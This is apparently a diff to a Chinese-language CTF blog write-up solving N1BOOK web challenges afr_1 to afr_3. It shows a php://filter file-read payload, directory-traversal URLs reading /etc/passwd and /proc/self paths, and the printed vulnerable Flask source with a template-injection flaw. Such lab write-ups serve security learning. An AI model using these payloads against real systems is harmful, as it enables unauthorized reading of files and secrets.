@@ -434,6 +434,84 @@ baidu.com.zip</code></pre><p>继续做题。</p>
 <p><img src="/2021/05/21/N1BOOK-刷题/1621586203783.png" alt="1621586203783"></p>
 <p>ok完成。</p>
 <p>我为啥老做些不动脑子的easy题。sql-lasb也是刷了几遍了。都当玩嘛。哎。</p>
+<h2><span id="第一章-web入门afr_1">[第一章 web入门]afr_1</span></h2><p>进入页面后:</p>
+<pre><code>http://1666ed77-0011-4f7b-b938-28f86f42c6a1.node3.buuoj.cn/?p=hello</code></pre><p>结果显示hello,world!</p>
+<p>也就是这儿p参数可能指文件极有可能后台代码:</p>
+<pre><code>include(&quot;$_GET[&#39;p&#39;]&quot;.&quot;php&quot;)</code></pre><p>所以解题很简单了:</p>
+<pre><code>p=php://filter/convert.base64-encode/resource=flag
+//这儿用php的伪协议进行文件流读取，猜测为flag文件。</code></pre><p>然后得到一串base64：</p>
+<p><img src="/2021/05/21/N1BOOK-刷题/1622349656175.png" alt="1622349656175"></p>
+<h2><span id="第一章-web入门afr_2">[第一章 web入门]afr_2</span></h2><p>进去后只有一个图片:</p>
+<p><img src="/2021/05/21/N1BOOK-刷题/1622356870895.png" alt="1622356870895"></p>
+<p>点到这个链接:</p>
+<p>退到img后发现目录遍历:</p>
+<p><img src="/2021/05/21/N1BOOK-刷题/1622356906101.png" alt="1622356906101"></p>
+<p>然后用../进行遍历:</p>
+<pre><code>http://e7fd8615-3fa5-46b7-a5ec-82ed9516636a.node3.buuoj.cn/img../</code></pre><p><img src="/2021/05/21/N1BOOK-刷题/1622356952454.png" alt="1622356952454"></p>
+<p>直接就有flag了。。</p>
+<p>今天看到一个知识点，这也是为什么../有时候能用有时候不能用的原因了。</p>
+<p>有的是代码直接把../这三个都过滤了。而更绝的是有点像sql注入那种预处理，比如上面这个/img../它如果没有把../当作上级目录识别而是识别img..为一个目录就会提示404而不会跨越目录。</p>
+<h2><span id="第一章-web入门afr_3">[第一章 web入门]afr_3</span></h2><p>继续第三道题</p>
+<p>直接点击点击就出现了下面的:</p>
+<pre><code>http://73c1f4b2-5f9a-4d5c-8ad3-a7bbdef04e71.node3.buuoj.cn/article?name=../../../../../../../../../../../../etc/passwd
+//我构造的../就读取到了/etc/passwd</code></pre><p>然后直接读取flag.</p>
+<p>结果提醒。no permission。这。</p>
+<p>我发现只要输入flag字符就会提示没有权限。可以用Linux中bash的一些字符来绕过。</p>
+<p>例如\。不行看样子不是这个思路。</p>
+<p>重新看了下书一般ctf题还有其他比较重要的目录:</p>
+<pre><code>/proc/self/cmdline
+获取当前执行的系统命令。
+获取这个主要是有些题目构建flag文件需要执行了某些命令而没有结束进程</code></pre><p><img src="/2021/05/21/N1BOOK-刷题/1622360563763.png" alt="1622360563763"></p>
+<p>执行了一个server.py</p>
+<pre><code>/proc/self/cwd/server.py
+获取执行文件的内容</code></pre><p>得到</p>
+<pre><code class="python">import os
+from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )
+from flask_session import Session
+
+app = Flask(__name__)
+execfile(&amp;#39;flag.py&amp;#39;)
+execfile(&amp;#39;key.py&amp;#39;)
+
+FLAG = flag
+app.secret_key = key
+@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def n1page():
+    if request.method != &quot;POST&quot;:
+        return redirect(url_for(&quot;index&quot;))
+    n1code = request.form.get(&quot;n1code&quot;) or None
+    if n1code is not None:
+        n1code = n1code.replace(&quot;.&quot;, &quot;&quot;).replace(&quot;_&quot;, &quot;&quot;).replace(&quot;{&quot;,&quot;&quot;).replace(&quot;}&quot;,&quot;&quot;)
+    if &quot;n1code&quot; not in session or session[&amp;#39;n1code&amp;#39;] is None:
+        session[&amp;#39;n1code&amp;#39;] = n1code
+    template = None
+    if session[&amp;#39;n1code&amp;#39;] is not None:
+        template = &amp;#39;&amp;#39;&amp;#39;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&amp;#39;t look at our &amp;lt;a href=&amp;#39;/article?name=article&amp;#39;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;#39;&amp;#39;&amp;#39; % session[&amp;#39;n1code&amp;#39;]
+        session[&amp;#39;n1code&amp;#39;] = None
+    return render_template_string(template)
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def index():
+    return render_template(&quot;main.html&quot;)
+@app.route(&amp;#39;/article&amp;#39;, methods=[&amp;#39;GET&amp;#39;])
+def article():
+    error = 0
+    if &amp;#39;name&amp;#39; in request.args:
+        page = request.args.get(&amp;#39;name&amp;#39;)
+    else:
+        page = &amp;#39;article&amp;#39;
+    if page.find(&amp;#39;flag&amp;#39;)&amp;gt;=0:
+        page = &amp;#39;notallowed.txt&amp;#39;
+    try:
+        template = open(&amp;#39;/home/nu11111111l/articles/{}&amp;#39;.format(page)).read()
+    except Exception as e:
+        template = e
+
+    return render_template(&amp;#39;article.html&amp;#39;, template=template)
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&amp;#39;0.0.0.0&amp;#39;, debug=False)</code></pre>
+<p>虽然整齐。特殊字符被编码了。看着好难受</p>
 
         </div>
         <!-- .entry-content -->
